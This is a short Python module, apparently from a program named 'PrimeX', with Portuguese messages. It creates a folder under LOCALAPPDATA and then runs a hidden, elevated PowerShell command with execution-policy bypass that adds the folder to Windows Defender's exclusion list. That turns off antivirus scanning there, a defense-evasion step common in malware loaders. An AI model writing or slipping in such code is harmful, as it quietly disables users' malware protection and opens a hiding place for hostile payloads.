import os
import subprocess
from pathlib import Path


def get_primex_path() -> str:
    base_dir = os.getenv("LOCALAPPDATA") or os.path.expanduser("~")
    return str(Path(base_dir) / "PrimeX")


def add_windows_defender_exclusion() -> bool:
    primex_path = get_primex_path()

    os.makedirs(primex_path, exist_ok=True)

    command = [
        "powershell",
        "-Command",
        f'Start-Process powershell -Verb RunAs -ArgumentList \'-NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath \\"{primex_path}\\""\''
    ]

    try:
        subprocess.run(
            command,
            check=False,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return True

    except Exception as e:
        print(f"[PrimeX] Erro ao adicionar exclusão no Defender: {e}")
        return False